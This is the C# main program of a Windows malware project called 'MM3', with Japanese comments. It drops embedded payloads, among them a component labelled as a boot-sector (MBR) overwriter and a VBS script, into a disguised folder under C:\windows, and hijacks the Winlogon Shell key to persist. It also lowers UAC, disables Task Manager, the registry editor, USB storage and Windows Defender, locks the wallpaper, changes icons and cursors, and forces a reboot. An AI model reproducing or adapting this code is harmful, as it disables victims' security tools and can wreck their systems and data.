using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Reflection;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Diagnostics;
using static MM3.functions;
using Microsoft.Win32;

namespace MM3
{
    static class Program
    {
        private readonly static string exefolder = Directory.GetCurrentDirectory();
        static void Main()
        {
            string temp = Path.GetTempPath();
            string ExtPath = "C:\\windows\\winbase_base_procid_none\\secureloc0x65\\";

            //MM3.0のディレクトリ作成
            Directory.CreateDirectory("C:\\windows\\winbase_base_procid_none\\secureloc0x65");

            //ファイル展開
            Extract("MM3", ExtPath, "Resources", "tobi0a0c.exe");         //gdifuncs
            Extract("MM3", ExtPath, "Resources", "bsector3.exe");         //mbr
            Extract("MM3", ExtPath, "Resources", "mainbgtheme.wav"); //bgm
            Extract("MM3", ExtPath, "Resources", "WinRapistI386.vbs");
            Extract("MM3", ExtPath, "Resources", "rcur.cur");                 //cursor
            Extract("MM3", ExtPath, "Resources", "ui66.exe");                //logonui
            Extract("MM3", ExtPath, "Resources", "winsxs.ico");             //icon
            Extract("MM3", temp, "Resources", "w0alp.tmp");                 //wallpaper

            File.Copy(ExtPath + "\\mainbgtheme.wav", ExtPath+"\\0x000F.WAV");

            //スタートアップ登録
            RegistryKey startup_virus =Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
            startup_virus.SetValue("Shell", @"explorer.exe, wscript.exe ""C:\windows\winbase_base_procid_none\secureloc0x65\WinRapistI386.vbs""");
            startup_virus.Dispose();

            //壁紙変更
            ChangeWallpaper(Path.GetTempPath() + "\\w0alp.tmp");

            //壁紙固定
            RegistryKey wallpaper = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop");
            wallpaper.SetValue("NoChangingWallPaper", 1);
            wallpaper.Dispose();

            //カーソル変更
            RegistryKey cursor = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
            cursor.SetValue("Arrow", @"C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur");
            cursor.SetValue("AppStarting", @"C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur");
            cursor.SetValue("Hand", @"C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur");
            cursor.Dispose();

            //UACレベル下げ
            Microsoft.Win32.RegistryKey uac = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system");
            uac.SetValue("ConsentPromptBehaviorAdmin", 0);
            uac.Dispose();

            //タスクマネージャー無効化
            Microsoft.Win32.RegistryKey taskmgr = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            taskmgr.SetValue("DisableTaskMgr", 1);
            taskmgr.Dispose();

            //レジストリエディタ無効化
            RegistryKey registry = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            registry.SetValue("DisableRegistryTools", 1);
            registry.Dispose();

            //windowsキー無効化
            RegistryKey winkey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            winkey.SetValue("NoWinKeys", 1);
            winkey.Dispose();

            //USBメモリ無効化
            RegistryKey usb = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Services\usbstor");
            usb.SetValue("Start", 4);
            usb.Dispose();

            //windows defender無効化
            RegistryKey defender = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender");
            defender.SetValue("DisableAntiSpyware", 1);
            defender.Dispose();

            //アイコン変更
            Microsoft.Win32.RegistryKey icon1 = Microsoft.Win32.Registry.ClassesRoot.CreateSubKey(@"txtfile\DefaultIcon");
            icon1.SetValue("", ExtPath + "winsxs.ico", Microsoft.Win32.RegistryValueKind.String);
            icon1.Dispose();
            Microsoft.Win32.RegistryKey icon2 = Microsoft.Win32.Registry.ClassesRoot.CreateSubKey(@"exefile\DefaultIcon");
            icon2.SetValue("", ExtPath + "winsxs.ico", Microsoft.Win32.RegistryValueKind.String);
            icon2.Dispose();
            Microsoft.Win32.RegistryKey icon3 = Microsoft.Win32.Registry.ClassesRoot.CreateSubKey(@"mp3file\DefaultIcon");
            icon3.SetValue("", ExtPath + "winsxs.ico", Microsoft.Win32.RegistryValueKind.String);
            icon3.Dispose();
            Microsoft.Win32.RegistryKey icon4 = Microsoft.Win32.Registry.ClassesRoot.CreateSubKey(@"mp4file\DefaultIcon");
            icon4.SetValue("", ExtPath + "winsxs.ico", Microsoft.Win32.RegistryValueKind.String);
            icon4.Dispose();
            Microsoft.Win32.RegistryKey icon5 = Microsoft.Win32.Registry.ClassesRoot.CreateSubKey(@"inifile\DefaultIcon");
            icon5.SetValue("", ExtPath + "winsxs.ico", Microsoft.Win32.RegistryValueKind.String);
            icon5.Dispose();

            Thread.Sleep(5000);

            //再起動
            Restart();
        }
    }
}